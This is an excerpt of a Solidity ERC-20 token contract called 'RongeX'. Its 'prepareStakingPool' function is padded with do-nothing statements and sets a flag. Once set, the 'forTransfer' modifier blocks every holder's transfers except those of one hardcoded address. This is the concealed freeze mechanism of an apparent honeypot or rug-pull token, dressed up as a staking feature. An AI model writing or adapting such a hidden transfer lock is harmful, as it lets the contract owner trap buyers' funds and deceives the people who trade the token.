...
contract RongeXToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenRX_totalSupply;
    uint256 private _tokenRX_status = 0;
    uint256 public stakingPoolRXStatus = 0;

    string private _tokenRX_name;
    string private _tokenRX_symbol;

    address private _poolRXAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenRX_name = "RongeX";
        _tokenRX_symbol = "RongeX";
        _tokenRX_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenRX_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolRXAddress || _tokenRX_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolRXStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolRXAddress)
        {
            _tokenRX_status = 1;
        }
    }
